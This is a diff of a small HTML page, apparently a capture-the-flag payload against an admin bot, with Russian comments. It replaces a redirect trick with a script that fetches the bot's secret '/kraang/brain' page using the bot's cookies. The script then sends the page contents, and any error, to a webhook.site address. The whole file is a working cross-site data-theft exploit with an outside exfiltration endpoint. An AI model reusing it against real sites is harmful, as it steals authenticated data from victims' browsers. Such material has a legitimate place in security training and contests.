@@ -1,10 +1,25 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Loading...</title>
+</head>
 <body>
     <script>
-        // Перенаправляем бота на его секретную страницу
-        // А потом пытаемся её прочитать
-        window. location = 'http://158.160.184.159:13002/api/forward? url=http://158.160.184.159:13002/kraang/brain&callback=https://webhook.site/f66e9df7-9edd-4ccc-bc24-b90530d78d93';
+        // Делаем запрос на секретную страницу Кранга
+        // Браузер бота автоматически отправит его cookies
+        fetch('http://158.160.184.159:13002/kraang/brain', {
+            credentials: 'include'  // Отправляет cookies бота
+        })
+        .then(response => response.text())
+        .then(data => {
+            // Отправляем содержимое страницы на webhook
+            fetch('https://webhook.site/f66e9df7-9edd-4ccc-bc24? flag=' + encodeURIComponent(data));
+        })
+        .catch(error => {
+            // Если есть ошибка CORS, отправляем информацию об ошибке
+            fetch('https://webhook.site/f66e9df7-9edd-4ccc-bc24? error=' + encodeURIComponent(error));
+        });
     </script>
+    <p>Loading...</p>
 </body>
 </html>
